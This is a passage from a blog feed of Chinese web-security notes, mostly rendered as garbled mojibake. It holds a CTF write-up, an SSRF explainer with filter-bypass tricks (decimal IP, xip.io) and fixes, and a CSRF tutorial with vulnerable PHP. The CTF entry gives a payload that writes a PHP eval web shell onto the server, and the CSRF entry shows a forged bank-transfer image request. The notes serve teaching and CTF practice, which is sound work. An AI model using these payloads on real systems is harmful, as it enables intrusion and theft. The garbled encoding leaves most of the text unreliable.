src="/2021/06/01/i-chun-qiu-web-look/ea614e0bd60de72daf4d01f55faafec.png" alt="ea614e0bd60de72daf4d01f55faafec"></p><p>è¿›å…¥ä»¥åŽåˆæ˜¯ä¸€æ®µä»£ç è¿›è¡Œå®¡è®¡ï¼š</p><pre><code>&lt;?phpif(isset($_GET['path'])&nbsp;&amp;&amp;&nbsp;isset($_GET['filename'])){&nbsp;&nbsp;&nbsp;&nbsp;$path&nbsp;=&nbsp;$_GET['path'];&nbsp;&nbsp;&nbsp;&nbsp;$name&nbsp;=&nbsp;"upload/".$_GET['filename'];}else{&nbsp;&nbsp;&nbsp;&nbsp;show_source(__FILE__);&nbsp;&nbsp;&nbsp;&nbsp;exit();}if(strpos($name,'..')&nbsp;&gt;&nbsp;-1){&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;'WTF';&nbsp;&nbsp;&nbsp;&nbsp;exit();}if(strpos($path,'http://127.0.0.1/')&nbsp;===&nbsp;0){&nbsp;&nbsp;&nbsp;&nbsp;file_put_contents($name,file_get_contents($path));}else{&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;'path&nbsp;error';}?&gt;</code></pre><pre><code>?filename=1.php&amp;path=http://127.0.0.1/5211ec9dde53ee65bb02225117fba1e1.php?usern3me=&lt;?php eval($_POST[1]);?&gt;</code></pre><p>å› ä¸ºæœ‰ä¸¤ä¸ªfileå‡½æ•°æ‰€ä»¥è¦åœ¨burpä¸­å°†ç©ºæ ¼ä¹Ÿå°±æ˜¯%20å†urlencodeä¸€æ¬¡å˜ä¸º%2520è§£æžæ˜¯æ‰ä¼šä¸ºç©ºæ ¼</p><p>ç„¶åŽèšå‰‘ç®€æ´</p><pre><code>url/upload/1.php</code></pre><p><img src="/2021/06/01/i-chun-qiu-web-look/ea5f97eaa4a22d10417703d95d4f16d.png" alt="ea5f97eaa4a22d10417703d95d4f16d"></p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web:JSONPæ³¨å…¥</title>
      <link href="2021/05/29/web-jsonp-zhu-ru/"/>
      <url>2021/05/29/web-jsonp-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/luyaran/article/details/55657266">https://blog.csdn.net/luyaran/article/details/55657266</a></p><p><a href="https://www.jianshu.com/p/6fd8486f6f8b">https://www.jianshu.com/p/6fd8486f6f8b</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ¼æ´žåˆ©ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web:ssrfæ¼æ´ž</title>
      <link href="2021/05/28/web-ssrf-lou-dong/"/>
      <url>2021/05/28/web-ssrf-lou-dong/</url>
      
        <content type="html"><![CDATA[<h5 id="å†…å®¹"><a href="#å†…å®¹" class="headerlink" title="å†…å®¹"></a>å†…å®¹</h5><pre><code>SSRFæ¼æ´žçš„å±å®³SSRFæ¼æ´žçš„æŒ–æŽ˜SSRFæ¼æ´žçš„é˜²å¾¡SSRFæ¼æ´žåŽŸç†æ¦‚è¿°</code></pre><h5 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h5><p>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æž„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´žã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»Žå¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚</p><h5 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h5><p>å¾ˆå¤šWebåº”ç”¨éƒ½æä¾›äº†ä»Žå…¶ä»–æœåŠ¡å™¨ä¸ŠèŽ·å–æ•°æ®çš„åŠŸèƒ½ã€‚ä½¿ç”¨ç”¨æˆ·æŒ‡å®šçš„URLï¼ŒWebåº”ç”¨å¯ä»¥èŽ·å–å›¾ç‰‡ï¼Œä¸‹è½½æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶å†…å®¹ç­‰ã€‚è¿™ä¸ªåŠŸèƒ½å¦‚æžœè¢«æ¶æ„ä½¿ç”¨ï¼Œå¯ä»¥åˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„webåº”ç”¨ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°æœåŠ¡å™¨ã€‚</p><h5 id="åŽŸç†"><a href="#åŽŸç†" class="headerlink" title="åŽŸç†"></a>åŽŸç†</h5><p>æœåŠ¡ç«¯æä¾›äº†ä»Žå…¶ä»–æœåŠ¡å™¨åº”ç”¨èŽ·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸Žé™åˆ¶ã€‚</p><p>å¤§éƒ¨åˆ†çš„webæœåŠ¡å™¨æž¶æž„ä¸­ï¼ŒwebæœåŠ¡å™¨è‡ªèº«éƒ½å¯ä»¥è®¿é—®äº’è”ç½‘å’ŒæœåŠ¡å™¨æ‰€åœ¨çš„å†…ç½‘ã€‚<br><img src="https://img-blog.csdnimg.cn/20190704194808189.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MTMzNzE3,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h5 id="SSRFå¯ä»¥åšä»€ä¹ˆ"><a href="#SSRFå¯ä»¥åšä»€ä¹ˆ" class="headerlink" title="SSRFå¯ä»¥åšä»€ä¹ˆ"></a>SSRFå¯ä»¥åšä»€ä¹ˆ</h5><pre><code>å¯ä»¥å¯¹å¤–ç½‘æœåŠ¡å™¨æ‰€åœ¨çš„å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼ŒèŽ·å–ä¸€äº›æœåŠ¡çš„bannerä¿¡æ¯ ã€‚æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–è€…æœ¬åœ°çš„åº”ç”¨ç¨‹åºã€‚å¯¹å†…ç½‘webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œé€šè¿‡è®¿é—®é»˜è®¤æ–‡ä»¶å®žçŽ° ã€‚æ”»å‡»å†…å¤–ç½‘çš„webåº”ç”¨ã€‚sqlæ³¨å…¥ã€struct2ã€redisç­‰ã€‚åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ç­‰ã€‚</code></pre><h5 id="SSRFæ¼æ´žæŒ–æŽ˜"><a href="#SSRFæ¼æ´žæŒ–æŽ˜" class="headerlink" title="SSRFæ¼æ´žæŒ–æŽ˜"></a>SSRFæ¼æ´žæŒ–æŽ˜</h5><p>ä¸€. WEBåŠŸèƒ½ä¸ŠæŸ¥æ‰¾<br>ç”±åŽŸç†å¯ä»¥çœ‹å‡ºï¼ŒSSRFæ˜¯ç”±äºŽæœåŠ¡ç«¯èŽ·å–å…¶ä»–æœåŠ¡å™¨çš„ç›¸å…³ä¿¡æ¯çš„åŠŸèƒ½ä¸­å½¢æˆçš„ï¼Œå› æ­¤æˆ‘ä»¬å¤§å¯ä»¥åˆ—ä¸¾å‡ ç§åœ¨web åº”ç”¨ä¸­å¸¸è§çš„ä»ŽæœåŠ¡ç«¯èŽ·å–å…¶ä»–æœåŠ¡å™¨ä¿¡æ¯çš„çš„åŠŸèƒ½ã€‚</p><p>1.é€šè¿‡URLåœ°å€åˆ†äº«ç½‘é¡µå†…å®¹æ—©æœŸåº”ç”¨ä¸­ ï¼Œä¸ºäº†æ›´å¥½çš„ç”¨æˆ·ä½“éªŒï¼ŒWebåº”ç”¨åœ¨åˆ†äº«åŠŸèƒ½ä¸­ï¼Œé€šå¸¸ä¼šèŽ·å–ç›®æ ‡URLåœ°å€ç½‘é¡µå†…å®¹ä¸­æ ‡ç­¾æˆ–è€…&lt;meta name=â€œdescriptionâ€content=â€œâ€/&gt;æ ‡ç­¾ä¸­contentçš„æ–‡æœ¬å†…å®¹æä¾›æ›´å¥½çš„ç”¨æˆ·ä½“éªŒã€‚</p><p><img src="https://img-blog.csdnimg.cn/20190704195033842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MTMzNzE3,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>2.è½¬ç æœåŠ¡<br>è½¬ç æœåŠ¡ï¼šé€šè¿‡URLåœ°å€æŠŠåŽŸåœ°å€çš„ç½‘é¡µå†…å®¹è°ƒä¼˜ä½¿å…¶é€‚åˆæ‰‹æœºå±å¹•æµè§ˆ</p><p>ç”±äºŽæ‰‹æœºå±å¹•å¤§å°çš„å…³ç³»ï¼Œç›´æŽ¥æµè§ˆç½‘é¡µå†…å®¹çš„æ—¶å€™ä¼šé€ æˆè®¸å¤šä¸ä¾¿ï¼Œå› æ­¤æœ‰äº›å…¬å¸æä¾›äº†è½¬ç åŠŸèƒ½ï¼ŒæŠŠç½‘é¡µå†…å®¹é€šè¿‡ç›¸å…³æ‰‹æ®µè½¬ä¸ºé€‚åˆæ‰‹æœºå±å¹•æµè§ˆçš„æ ·å¼ã€‚ä¾‹å¦‚ç™¾åº¦ã€è…¾è®¯ã€æœç‹—ç­‰å…¬å¸éƒ½æœ‰æä¾›åœ¨çº¿è½¬ç æœåŠ¡ã€‚</p><p>3.åœ¨çº¿ç¿»è¯‘<br>åœ¨çº¿ç¿»è¯‘ï¼šé€šè¿‡ URLåœ°å€ç¿»è¯‘å¯¹åº”æ–‡æœ¬çš„å†…å®¹ã€‚æä¾›æ­¤åŠŸèƒ½çš„ç™¾åº¦ã€æœ‰é“ç­‰ã€‚<br>æœ‰é“ç¿»è¯‘æŸå¤„SSRFå¯é€šç½‘æ˜“å†…ç½‘ï¼š<br><a href="http://www.anquan.us/static/bugs/wooyun-2016-0198176.html">http://www.anquan.us/static/bugs/wooyun-2016-0198176.html</a></p><p>4.å›¾ç‰‡åŠ è½½ä¸Žä¸‹è½½<br>å›¾ç‰‡åŠ è½½ä¸Žä¸‹è½½ï¼šé€šè¿‡ URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡<br>å›¾ç‰‡åŠ è½½è¿œç¨‹å›¾ç‰‡åœ°å€æ­¤åŠŸèƒ½ç”¨åˆ°çš„åœ°æ–¹å¾ˆå¤šï¼Œä½†å¤§å¤šéƒ½æ˜¯æ¯”è¾ƒéšç§˜ï¼Œæ¯”å¦‚åœ¨æœ‰äº›å…¬å¸ä¸­çš„åŠ è½½è‡ªå®¶å›¾ç‰‡æœåŠ¡å™¨ä¸Šçš„å›¾ç‰‡ç”¨äºŽå±•ç¤ºã€‚ï¼ˆæ­¤å¤„å¯èƒ½ä¼šæœ‰äººæœ‰ç–‘é—®ï¼Œä¸ºä»€ä¹ˆåŠ è½½å›¾ç‰‡æœåŠ¡å™¨ä¸Šçš„å›¾ç‰‡ä¹Ÿä¼šæœ‰é—®é¢˜ï¼Œç›´æŽ¥ä½¿ç”¨imgæ ‡ç­¾ä¸å°±å¥½äº†ï¼Œæ²¡é”™æ˜¯è¿™æ ·ï¼Œä½†æ˜¯å¼€å‘è€…ä¸ºäº†æœ‰æ›´å¥½çš„ç”¨æˆ·ä½“éªŒé€šå¸¸å¯¹å›¾ç‰‡åšäº›å¾®å°è°ƒæ•´ä¾‹å¦‚åŠ æ°´å°ã€åŽ‹ç¼©ç­‰ï¼Œå°±å¿…é¡»è¦æŠŠå›¾ç‰‡ä¸‹è½½åˆ°æœåŠ¡å™¨çš„æœ¬åœ°ï¼Œæ‰€ä»¥å°±å¯èƒ½é€ æˆSSRFé—®é¢˜ï¼‰ã€‚</p><p>äºŒ. ä»ŽURLå…³é”®å­—ä¸­å¯»æ‰¾</p><pre><code>Shareã€wapã€urlã€linkã€srcã€sourceã€targetã€uã€3gã€displayã€sourceURLã€imageURLã€domain</code></pre><p>ä¸‰. é€šç”¨çš„SSRFå®žä¾‹</p><pre><code>Weblogicé…ç½®ä¸å½“ï¼Œå¤©ç”Ÿssrfæ¼æ´žDiscuz x2.5/x3.0/x3.1/x3.2 ssrfæ¼æ´ž</code></pre><p>SSRFæ¼æ´žçš„éªŒè¯</p><p><a href="http://www.douban.com/***/service?image=http://www.baidu.com/img/bd_logo1.png">http://www.douban.com/***/service?image=http://www.baidu.com/img/bd_logo1.png</a></p><pre><code>æˆ‘ä»¬å…ˆéªŒè¯ï¼Œè¯·æ±‚æ˜¯å¦æ˜¯æœåŠ¡å™¨ç«¯å‘å‡ºçš„ï¼Œå¯ä»¥å³é”®å›¾ç‰‡ï¼Œä½¿ç”¨æ–°çª—å£æ‰“å¼€å›¾ç‰‡ï¼Œå¦‚æžœæµè§ˆå™¨ä¸Šåœ°å€æ æ˜¯http://www.baidu.com/img/bd_logo1.pngï¼Œè¯´æ˜Žä¸å­˜åœ¨SSRFæ¼æ´žã€‚å¯ä»¥åœ¨Firebug æˆ–è€…burpsuiteæŠ“åŒ…å·¥å…·ï¼ŒæŸ¥çœ‹è¯·æ±‚æ•°æ®åŒ…ä¸­æ˜¯å¦åŒ…å«http://www.baidu.com/img/bd_logo1.pngè¿™ä¸ªè¯·æ±‚ã€‚ç”±äºŽSSRFæ˜¯æœåŠ¡ç«¯å‘èµ·çš„è¯·æ±‚ï¼Œå› æ­¤åœ¨åŠ è½½è¿™å¼ å›¾ç‰‡çš„æ—¶å€™æœ¬åœ°æµè§ˆå™¨ä¸­ä¸åº”è¯¥å­˜åœ¨å›¾ç‰‡çš„è¯·æ±‚ã€‚åœ¨éªŒè¯å®Œæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„è¯·æ±‚ä¹‹åŽï¼Œæ­¤å¤„å°±æœ‰å¯èƒ½å­˜åœ¨SSRFï¼ŒæŽ¥ä¸‹æ¥éœ€è¦éªŒè¯æ­¤URLæ˜¯å¦å¯ä»¥æ¥è¯·æ±‚å¯¹åº”çš„å†…ç½‘åœ°å€ã€‚é¦–å…ˆæˆ‘ä»¬è¦èŽ·å–å†…ç½‘å­˜åœ¨HTTPæœåŠ¡ä¸”å­˜åœ¨favicon.icoæ–‡ä»¶åœ°å€ï¼Œæ‰èƒ½éªŒè¯æ˜¯å¦æ˜¯SSRFã€‚</code></pre><p>æ­¤å¤„æ‰¾å†…ç½‘åœ°å€å¯ä»¥é€šè¿‡ä»Žæ¼æ´žå¹³å°ä¸­çš„åŽ†å²æ¼æ´žå¯»æ‰¾æ³„éœ²çš„å†…ç½‘åœ°å€è¿‡æ»¤ç»•è¿‡</p><p>@ï¼š<br><a href="http://www.baidu.com@10.10.10.10ä¸Žhttp/?/10.10.10.10">http://www.baidu.com@10.10.10.10ä¸Žhttp?/10.10.10.10</a> è¯·æ±‚æ˜¯ç›¸åŒçš„</p><p>è¿‡æ»¤ç»•è¿‡<br>IPåœ°å€è½¬æ¢æˆåè¿›åˆ¶ï¼š<br>127.0.0.1=2130706433<br><img src="https://img-blog.csdnimg.cn/20190704200442980.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MTMzNzE3,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>xip.io<br>xip.io127.0.0.1.xip.io â€“&gt;127.0.0.1<br><a href="http://www.127.0.0.1.xip.io/">www.127.0.0.1.xip.io</a> â€“&gt;127.0.0.1<br>Haha.127.0.0.1.xip.io â€“&gt;127.0.0.1<br>Haha.xixi.127.0.0.1.xip.io â€“&gt;127.0.0.1</p><p>ä¿®å¤æ–¹æ¡ˆ</p><pre><code>ç»Ÿä¸€é”™è¯¯ä¿¡æ¯ï¼Œé¿å…ç”¨æˆ·å¯ä»¥æ ¹æ®é”™è¯¯ä¿¡æ¯æ¥åˆ¤æ–­è¿œç¨‹æœåŠ¡å™¨ç«¯å£çŠ¶æ€é™åˆ¶è¯·æ±‚çš„ç«¯å£ä¸ºHTTPå¸¸ç”¨çš„ç«¯å£ï¼Œæ¯”å¦‚ 80,443,8080,8088ç­‰é»‘åå•å†…ç½‘IPã€‚ç¦ç”¨ä¸éœ€è¦çš„åè®®ï¼Œä»…ä»…å…è®¸HTTPå’ŒHTTPS.</code></pre><p>ç›¸å…³èµ„æº</p><pre><code>[å®‰å…¨ç§‘æ™®]SSRFæ”»å‡»å®žä¾‹è§£æžä¹Œäº‘å¤šæ•°å·²ä¿®å¤SSRFæ¼æ´žå¯è¢«ç»•è¿‡åˆ©ç”¨ Gopher åè®®æ‹“å±•æ”»å‡»é¢SSRF libcurl protocol wrappersåˆ©ç”¨åˆ†æž</code></pre><p>åŽŸæ–‡é“¾æŽ¥ï¼š<a href="https://blog.csdn.net/qq_37133717/article/details/94647789">https://blog.csdn.net/qq_37133717/article/details/94647789</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ¼æ´žåˆ©ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web:csrfæ¼æ´ž</title>
      <link href="2021/05/27/web-csrf-lou-dong/"/>
      <url>2021/05/27/web-csrf-lou-dong/</url>
      
        <content type="html"><![CDATA[<p><strong>ä¸€.CSRFæ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><p>ã€€ã€€CSRFï¼ˆCross-site request forgeryï¼‰ï¼Œä¸­æ–‡åç§°ï¼šè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œä¹Ÿè¢«ç§°ä¸ºï¼šone click attack/session ridingï¼Œç¼©å†™ä¸ºï¼šCSRF/XSRFã€‚</p><p><strong>äºŒ.CSRFå¯ä»¥åšä»€ä¹ˆï¼Ÿ</strong></p><p>ã€€ã€€ä½ è¿™å¯ä»¥è¿™ä¹ˆç†è§£CSRFæ”»å‡»ï¼šæ”»å‡»è€…ç›—ç”¨äº†ä½ çš„èº«ä»½ï¼Œä»¥ä½ çš„åä¹‰å‘é€æ¶æ„è¯·æ±‚ã€‚CSRFèƒ½å¤Ÿåšçš„äº‹æƒ…åŒ…æ‹¬ï¼šä»¥ä½ åä¹‰å‘é€é‚®ä»¶ï¼Œå‘æ¶ˆæ¯ï¼Œç›—å–ä½ çš„è´¦å·ï¼Œç”šè‡³äºŽè´­ä¹°å•†å“ï¼Œè™šæ‹Ÿè´§å¸è½¬è´¦â€¦â€¦é€ æˆçš„é—®é¢˜åŒ…æ‹¬ï¼šä¸ªäººéšç§æ³„éœ²ä»¥åŠè´¢äº§å®‰å…¨ã€‚</p><p><strong>ä¸‰.CSRFæ¼æ´žçŽ°çŠ¶</strong></p><p>ã€€ã€€CSRFè¿™ç§æ”»å‡»æ–¹å¼åœ¨2000å¹´å·²ç»è¢«å›½å¤–çš„å®‰å…¨äººå‘˜æå‡ºï¼Œä½†åœ¨å›½å†…ï¼Œç›´åˆ°06å¹´æ‰å¼€å§‹è¢«å…³æ³¨ï¼Œ08å¹´ï¼Œå›½å†…å¤–çš„å¤šä¸ªå¤§åž‹ç¤¾åŒºå’Œäº¤äº’ç½‘ç«™åˆ†åˆ«çˆ†å‡ºCSRFæ¼æ´žï¼Œå¦‚ï¼šNYTimes.comï¼ˆçº½çº¦æ—¶æŠ¥ï¼‰ã€Metafilterï¼ˆä¸€ä¸ªå¤§åž‹çš„BLOGç½‘ç«™ï¼‰ï¼ŒYouTubeå’Œç™¾åº¦HIâ€¦â€¦è€ŒçŽ°åœ¨ï¼Œäº’è”ç½‘ä¸Šçš„è®¸å¤šç«™ç‚¹ä»å¯¹æ­¤æ¯«æ— é˜²å¤‡ï¼Œä»¥è‡³äºŽå®‰å…¨ä¸šç•Œç§°CSRFä¸ºâ€œæ²‰ç¡çš„å·¨äººâ€ã€‚</p><p><strong>å››.CSRFçš„åŽŸç†</strong></p><p>ã€€ã€€ä¸‹å›¾ç®€å•é˜è¿°äº†CSRFæ”»å‡»çš„æ€æƒ³ï¼š</p><p>ã€€ã€€<img src="https://pic002.cnblogs.com/img/hyddd/200904/2009040916453171.jpg" alt="img"></p><p>ã€€ã€€ä»Žä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼Œè¦å®Œæˆä¸€æ¬¡CSRFæ”»å‡»ï¼Œå—å®³è€…å¿…é¡»ä¾æ¬¡å®Œæˆä¸¤ä¸ªæ­¥éª¤ï¼š</p><p>ã€€ã€€1.ç™»å½•å—ä¿¡ä»»ç½‘ç«™Aï¼Œå¹¶åœ¨æœ¬åœ°ç”ŸæˆCookieã€‚</p><p>ã€€ã€€2.åœ¨ä¸ç™»å‡ºAçš„æƒ…å†µä¸‹ï¼Œè®¿é—®å±é™©ç½‘ç«™Bã€‚</p><p>ã€€ã€€çœ‹åˆ°è¿™é‡Œï¼Œä½ ä¹Ÿè®¸ä¼šè¯´ï¼šâ€œå¦‚æžœæˆ‘ä¸æ»¡è¶³ä»¥ä¸Šä¸¤ä¸ªæ¡ä»¶ä¸­çš„ä¸€ä¸ªï¼Œæˆ‘å°±ä¸ä¼šå—åˆ°CSRFçš„æ”»å‡»â€ã€‚æ˜¯çš„ï¼Œç¡®å®žå¦‚æ­¤ï¼Œä½†ä½ ä¸èƒ½ä¿è¯ä»¥ä¸‹æƒ…å†µä¸ä¼šå‘ç”Ÿï¼š</p><p>ã€€ã€€1.ä½ ä¸èƒ½ä¿è¯ä½ ç™»å½•äº†ä¸€ä¸ªç½‘ç«™åŽï¼Œä¸å†æ‰“å¼€ä¸€ä¸ªtabé¡µé¢å¹¶è®¿é—®å¦å¤–çš„ç½‘ç«™ã€‚</p><p>ã€€ã€€2.ä½ ä¸èƒ½ä¿è¯ä½ å…³é—­æµè§ˆå™¨äº†åŽï¼Œä½ æœ¬åœ°çš„Cookieç«‹åˆ»è¿‡æœŸï¼Œä½ ä¸Šæ¬¡çš„ä¼šè¯å·²ç»ç»“æŸã€‚ï¼ˆäº‹å®žä¸Šï¼Œå…³é—­æµè§ˆå™¨ä¸èƒ½ç»“æŸä¸€ä¸ªä¼šè¯ï¼Œä½†å¤§å¤šæ•°äººéƒ½ä¼šé”™è¯¯çš„è®¤ä¸ºå…³é—­æµè§ˆå™¨å°±ç­‰äºŽé€€å‡ºç™»å½•/ç»“æŸä¼šè¯äº†â€¦â€¦ï¼‰</p><p>ã€€ã€€3.ä¸Šå›¾ä¸­æ‰€è°“çš„æ”»å‡»ç½‘ç«™ï¼Œå¯èƒ½æ˜¯ä¸€ä¸ªå­˜åœ¨å…¶ä»–æ¼æ´žçš„å¯ä¿¡ä»»çš„ç»å¸¸è¢«äººè®¿é—®çš„ç½‘ç«™ã€‚</p><p>ã€€ã€€ä¸Šé¢å¤§æ¦‚åœ°è®²äº†ä¸€ä¸‹CSRFæ”»å‡»çš„æ€æƒ³ï¼Œä¸‹é¢æˆ‘å°†ç”¨å‡ ä¸ªä¾‹å­è¯¦ç»†è¯´è¯´å…·ä½“çš„CSRFæ”»å‡»ï¼Œè¿™é‡Œæˆ‘ä»¥ä¸€ä¸ªé“¶è¡Œè½¬è´¦çš„æ“ä½œä½œä¸ºä¾‹å­ï¼ˆä»…ä»…æ˜¯ä¾‹å­ï¼ŒçœŸå®žçš„é“¶è¡Œç½‘ç«™æ²¡è¿™ä¹ˆå‚»:&gt;ï¼‰</p><p>ã€€ã€€<strong>ç¤ºä¾‹1ï¼š</strong></p><p>ã€€ã€€é“¶è¡Œç½‘ç«™Aï¼Œå®ƒä»¥GETè¯·æ±‚æ¥å®Œæˆé“¶è¡Œè½¬è´¦çš„æ“ä½œï¼Œå¦‚ï¼š<a href="http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</a></p><p>ã€€ã€€å±é™©ç½‘ç«™Bï¼Œå®ƒé‡Œé¢æœ‰ä¸€æ®µHTMLçš„ä»£ç å¦‚ä¸‹ï¼š</p><p>ã€€ã€€&lt;img&nbsp;src=<a href="http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000>">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</a></p><p>ã€€ã€€é¦–å…ˆï¼Œä½ ç™»å½•äº†é“¶è¡Œç½‘ç«™Aï¼Œç„¶åŽè®¿é—®å±é™©ç½‘ç«™Bï¼Œå™¢ï¼Œè¿™æ—¶ä½ ä¼šå‘çŽ°ä½ çš„é“¶è¡Œè´¦æˆ·å°‘äº†1000å—â€¦â€¦</p><p>ã€€ã€€ä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘¢ï¼ŸåŽŸå› æ˜¯é“¶è¡Œç½‘ç«™Aè¿åäº†HTTPè§„èŒƒï¼Œä½¿ç”¨GETè¯·æ±‚æ›´æ–°èµ„æºã€‚åœ¨è®¿é—®å±é™©ç½‘ç«™Bçš„ä¹‹å‰ï¼Œä½ å·²ç»ç™»å½•äº†é“¶è¡Œç½‘ç«™Aï¼Œè€ŒBä¸­çš„<img>ä»¥GETçš„æ–¹å¼è¯·æ±‚ç¬¬ä¸‰æ–¹èµ„æºï¼ˆè¿™é‡Œçš„ç¬¬ä¸‰æ–¹å°±æ˜¯æŒ‡é“¶è¡Œç½‘ç«™äº†ï¼ŒåŽŸæœ¬è¿™æ˜¯ä¸€ä¸ªåˆæ³•çš„è¯·æ±‚ï¼Œä½†è¿™é‡Œè¢«ä¸æ³•åˆ†å­åˆ©ç”¨äº†ï¼‰ï¼Œæ‰€ä»¥ä½ çš„æµè§ˆå™¨ä¼šå¸¦ä¸Šä½ çš„é“¶è¡Œç½‘ç«™Açš„Cookieå‘å‡ºGetè¯·æ±‚ï¼ŒåŽ»èŽ·å–èµ„æºâ€œ<a href="http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000%E2%80%9D%EF%BC%8C%E7%BB%93%E6%9E%9C%E9%93%B6%E8%A1%8C%E7%BD%91%E7%AB%99%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%B6%E5%88%B0%E8%AF%B7%E6%B1%82%E5%90%8E%EF%BC%8C%E8%AE%A4%E4%B8%BA%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E6%9B%B4%E6%96%B0%E8%B5%84%E6%BA%90%E6%93%8D%E4%BD%9C%EF%BC%88%E8%BD%AC%E8%B4%A6%E6%93%8D%E4%BD%9C%EF%BC%89%EF%BC%8C%E6%89%80%E4%BB%A5%E5%B0%B1%E7%AB%8B%E5%88%BB%E8%BF%9B%E8%A1%8C%E8%BD%AC%E8%B4%A6%E6%93%8D%E4%BD%9C">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000â€ï¼Œç»“æžœé“¶è¡Œç½‘ç«™æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åŽï¼Œè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªæ›´æ–°èµ„æºæ“ä½œï¼ˆè½¬è´¦æ“ä½œï¼‰ï¼Œæ‰€ä»¥å°±ç«‹åˆ»è¿›è¡Œè½¬è´¦æ“ä½œ</a>â€¦â€¦</p><p>ã€€ã€€<strong>ç¤ºä¾‹2ï¼š</strong></p><p>ã€€ã€€ä¸ºäº†æœç»ä¸Šé¢çš„é—®é¢˜ï¼Œé“¶è¡Œå†³å®šæ”¹ç”¨POSTè¯·æ±‚å®Œæˆè½¬è´¦æ“ä½œã€‚</p><p>ã€€ã€€é“¶è¡Œç½‘ç«™Açš„WEBè¡¨å•å¦‚ä¸‹ï¼šã€€ã€€</p><p>ã€€ã€€<formÂ action="transfer.php"Â method="post">ã€€ã€€ã€€ã€€</formÂ action="transfer.php"Â method="post"></p><p>ToBankId:&nbsp;<inputÂ type="text"Â name="tobankid"Â ></inputÂ type="text"Â name="tobankid"Â ></p>ã€€ã€€ã€€ã€€<p>Money:&nbsp;<inputÂ type="text"Â name="money"Â ></inputÂ type="text"Â name="money"Â ></p>ã€€ã€€ã€€ã€€<p><inputÂ type="submit"Â value="transfer"Â ></inputÂ type="submit"Â value="transfer"Â ></p>ã€€ã€€<p></p><p>ã€€ã€€åŽå°å¤„ç†é¡µé¢Transfer.phpå¦‚ä¸‹ï¼š</p><pre><code>&lt;?phpã€€ã€€ã€€ã€€session_start();ã€€ã€€ã€€ã€€if (isset($_REQUEST['toBankId'] &amp;&amp;ã€€isset($_REQUEST['money']))ã€€ã€€ã€€ã€€{ã€€ã€€ã€€ã€€  buy_stocks($_REQUEST['toBankId'],ã€€$_REQUEST['money']);ã€€ã€€ã€€ã€€}ã€€ã€€?&gt;</code></pre><p>ã€€ã€€å±é™©ç½‘ç«™Bï¼Œä»ç„¶åªæ˜¯åŒ…å«é‚£å¥HTMLä»£ç ï¼š</p><pre><code>ã€€&lt;img&nbsp;src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</code></pre><p>ã€€ã€€å’Œç¤ºä¾‹1ä¸­çš„æ“ä½œä¸€æ ·ï¼Œä½ é¦–å…ˆç™»å½•äº†é“¶è¡Œç½‘ç«™Aï¼Œç„¶åŽè®¿é—®å±é™©ç½‘ç«™Bï¼Œç»“æžœâ€¦..å’Œç¤ºä¾‹1ä¸€æ ·ï¼Œä½ 